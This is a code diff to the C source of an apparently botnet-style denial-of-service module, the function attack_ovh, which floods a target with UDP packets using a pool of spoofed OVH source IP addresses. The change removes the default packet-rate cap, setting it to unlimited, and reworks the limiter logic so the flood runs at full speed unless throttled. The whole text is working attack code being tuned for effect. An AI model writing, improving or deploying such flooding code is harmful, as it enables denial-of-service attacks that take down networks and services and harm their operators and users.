@@ -65,7 +65,7 @@ void attack_ovh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len
     port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
     port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
     int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
-    int pps_limiter = attack_get_opt_int(opts_len, opts, ATK_OPT_PPS, 500);
+    int pps_limiter = attack_get_opt_int(opts_len, opts, ATK_OPT_PPS, 0);
     uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
 
     // Large pool of OVH source IPs for spoofing
@@ -127,9 +127,8 @@ void attack_ovh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len
         payload[i] = ovh_rand() & 0xff;
     }
 
-    int limiter = 0;
+    int sent = 0;
     int sleeptime = 100;
-    unsigned int pps = 0;
 
     while (TRUE)
     {
@@ -174,10 +173,11 @@ void attack_ovh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len
 
             sendto(fd, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
 
-            pps++;
-            if (pps >= limiter && limiter > 0)
+            sent++;
+            // Apply PPS limiter if set (> 0 means limited)
+            if (pps_limiter > 0 && sent >= pps_limiter)
             {
-                pps = 0;
+                sent = 0;
                 usleep(sleeptime);
             }
         }
